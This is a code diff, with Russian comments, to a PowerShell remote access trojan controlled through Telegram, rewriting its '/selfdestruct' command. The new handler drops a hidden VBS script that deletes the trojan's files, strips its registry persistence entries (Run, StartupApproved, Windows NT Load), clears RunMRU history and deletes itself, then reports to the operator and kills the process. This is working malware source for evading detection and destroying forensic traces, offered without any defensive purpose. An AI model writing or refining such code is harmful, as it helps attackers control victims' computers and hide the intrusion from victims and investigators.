@@ -244,90 +244,69 @@ $($fileList -join "`n")"
                             }
                         }
                         "^/selfdestruct$" {
-                            # НОВАЯ РАБОЧАЯ ФУНКЦИЯ САМОУНИЧТОЖЕНИЯ
-                            $successCount = 0
-                            $totalSteps = 0
-                            $report = "🔴 Начинаю самоуничтожение...`n"
+                            # РЕАЛЬНО РАБОТАЮЩАЯ ФУНКЦИЯ САМОУНИЧТОЖЕНИЯ
+                            $report = "🔄 Начинаю реальное самоуничтожение...`n"
                             
-                            # 1. Удаление из автозагрузки
-                            $totalSteps++
-                            try {
-                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $uniqueName -Force -ErrorAction Stop
-                                $report += "✅ Автозагрузка Run очищена`n"
-                                $successCount++
-                            } catch {
-                                $report += "❌ Ошибка очистки автозагрузки Run`n"
-                            }
-                            
-                            $totalSteps++
-                            try {
-                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name $uniqueName -Force -ErrorAction Stop
-                                $report += "✅ Автозагрузка StartupApproved очищена`n"
-                                $successCount++
-                            } catch {
-                                $report += "❌ Ошибка очистки автозагрузки StartupApproved`n"
-                            }
-                            
-                            $totalSteps++
-                            try {
-                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "Load" -Force -ErrorAction Stop
-                                $report += "✅ Автозагрузка Windows NT очищена`n"
-                                $successCount++
-                            } catch {
-                                $report += "❌ Ошибка очистки автозагрузки Windows NT`n"
-                            }
-                            
-                            # 2. Очистка истории RUN
-                            $totalSteps++
-                            try {
-                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction Stop
-                                $report += "✅ История RUN очищена`n"
-                                $successCount++
-                            } catch {
-                                $report += "❌ Ошибка очистки истории RUN`n"
-                            }
-                            
-                            # 3. Создание самоудаляющегося скрипта
-                            $selfDeleteScript = @"
-Start-Sleep -Seconds 3
-try {
-    Remove-Item "$scriptPath" -Force -ErrorAction SilentlyContinue
-    Remove-Item "$batPath" -Force -ErrorAction SilentlyContinue
-    `$currentScript = Get-Process -Id `$PID | Select-Object -ExpandProperty Path
-    if (`$currentScript -and (Test-Path `$currentScript)) {
-        Remove-Item `$currentScript -Force -ErrorAction SilentlyContinue
-    }
-} catch { }
+                            # 1. Создаем VBS скрипт для удаления файлов после завершения процесса
+                            $vbsScript = @"
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set WshShell = CreateObject("WScript.Shell")
+
+' Ждем завершения процесса
+WScript.Sleep 5000
+
+' Удаляем файлы
+On Error Resume Next
+fso.DeleteFile "$scriptPath", True
+fso.DeleteFile "$batPath", True
+fso.DeleteFile "$($MyInvocation.MyCommand.Path)", True
+
+' Очищаем реестр
+WshShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\$uniqueName\"
+WshShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run\$uniqueName\"
+WshShell.RegDelete "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load\"
+
+' Очищаем историю RUN
+WshShell.Run "cmd /c reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f", 0, True
+
+' Удаляем сам VBS скрипт
+fso.DeleteFile WScript.ScriptFullName, True
 "@
+
+                            $vbsPath = [System.IO.Path]::GetTempFileName() + ".vbs"
+                            $vbsScript | Out-File -FilePath $vbsPath -Encoding ASCII
+
+                            # 2. Запускаем VBS скрипт
+                            $vbsProcess = Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden -PassThru
                             
-                            $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
-                            $selfDeleteScript | Out-File -FilePath $tempScript -Encoding UTF8
-                            
-                            # 4. Запуск самоудаления в отдельном процессе
-                            $totalSteps++
+                            # 3. Очищаем реестр немедленно
                             try {
-                                Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`"" -WindowStyle Hidden
-                                $report += "✅ Процесс самоудаления запущен`n"
-                                $successCount++
-                            } catch {
-                                $report += "❌ Ошибка запуска самоудаления`n"
-                            }
+                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $uniqueName -Force -ErrorAction SilentlyContinue
+                                $report += "✅ Автозагрузка Run очищена`n"
+                            } catch { $report += "❌ Ошибка Run`n" }
                             
-                            # 5. Финальный отчет
-                            $successRate = [math]::Round(($successCount / $totalSteps) * 100, 2)
-                            $report += "`n📊 Результат: $successCount/$totalSteps шагов выполнено ($successRate%)"
+                            try {
+                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name $uniqueName -Force -ErrorAction SilentlyContinue
+                                $report += "✅ Автозагрузка StartupApproved очищена`n"
+                            } catch { $report += "❌ Ошибка StartupApproved`n" }
                             
-                            if ($successRate -ge 80) {
-                                $report += "`n🟢 САМОУНИЧТОЖЕНИЕ УСПЕШНО! Большинство следов удалено."
-                            } elseif ($successRate -ge 50) {
-                                $report += "`n🟡 САМОУНИЧТОЖЕНИЕ ЧАСТИЧНО УСПЕШНО! Некоторые следы остались."
-                            } else {
-                                $report += "`n🔴 САМОУНИЧТОЖЕНИЕ НЕУДАЧНО! Требуется ручная очистка."
-                            }
+                            try {
+                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "Load" -Force -ErrorAction SilentlyContinue
+                                $report += "✅ Автозагрузка Windows NT очищена`n"
+                            } catch { $report += "❌ Ошибка Windows NT`n" }
                             
+                            try {
+                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+                                $report += "✅ История RUN очищена`n"
+                            } catch { $report += "❌ Ошибка истории RUN`n" }
+
+                            $report += "`n🗑️ Файлы будут удалены через 5 секунд..."
+                            $report += "`n⚠️ RAT завершает работу..."
+
                             Send-Telegram $report
                             
-                            # 6. Немедленное завершение работы
+                            # 4. Немедленно завершаем работу
+                            Start-Sleep -Seconds 2
                             Stop-Process -Id $PID -Force
                         }
                     }
